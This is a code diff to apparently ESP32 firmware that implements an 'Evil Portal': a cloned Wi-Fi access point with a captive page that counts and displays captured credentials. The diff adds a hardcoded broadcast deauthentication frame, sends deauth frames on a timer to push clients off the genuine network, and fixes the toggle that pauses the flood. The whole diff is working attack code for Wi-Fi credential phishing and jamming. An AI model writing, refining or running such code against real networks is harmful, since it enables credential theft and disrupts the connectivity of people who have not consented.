@@ -14,6 +14,14 @@ int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
 String capturedCredentialsHtml = "";
 
+// Default Drauth Frame
+const uint8_t deauth_frame_default2[] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00
+};
 
 class CaptiveRequestHandler : public AsyncWebHandler {
 public:
@@ -55,7 +63,7 @@ public:
   }
 };
 
-void startEvilPortal(String tssid, uint8_t* bssid, uint8_t channel, bool deauth) {
+void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     bool redraw=true;
     Serial.begin(115200);
     // Definição da matriz "Options"
@@ -70,7 +78,8 @@ void startEvilPortal(String tssid, uint8_t* bssid, uint8_t channel, bool deauth)
     //  tssid="" means that are opening a virgin Evil Portal
     if (tssid=="") AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
     else { // tssid != "" means that is was cloned and can deploy Deauth
-      memcpy(ap_record.bssid, bssid, 6);
+      //memcpy(ap_record.bssid, bssid, 6);
+      memcpy(deauth_frame, deauth_frame_default2, sizeof(deauth_frame_default2));
       wsl_bypasser_send_raw_frame(&ap_record,channel);
       AP_name = tssid;
     }
@@ -122,10 +131,12 @@ void startEvilPortal(String tssid, uint8_t* bssid, uint8_t channel, bool deauth)
     ep->begin();
 
     tft.fillRect(6, 27, WIDTH-12, HEIGHT-33, BGCOLOR);
-    drawMainMenu(0);
+    drawMainMenu();
     menu_op.deleteSprite();
     menu_op.createSprite(WIDTH-20, HEIGHT-35);
     bool hold_deauth = false;
+    int tmp=millis(); // one deauth frame each 30ms at least
+    checkSelPress();
     while(1) {
       if(totalCapturedCredentials!=previousTotalCapturedCredentials) {
         redraw=true;
@@ -161,11 +172,15 @@ void startEvilPortal(String tssid, uint8_t* bssid, uint8_t channel, bool deauth)
         redraw=false;
       }
 
-      if(!hold_deauth) wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
+      if(!hold_deauth && (millis()-tmp) >20)  { 
+        wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
+        tmp=millis();
+      }
 
       if(checkSelPress() && deauth) {
-        while(checkSelPress()) { yield(); } // timerless debounce
-        !hold_deauth;
+        while(checkSelPress()) { delay(80); } // timerless debounce
+        hold_deauth = !hold_deauth;
+        redraw=true;
       }
 
       dnsServer.processNextRequest();
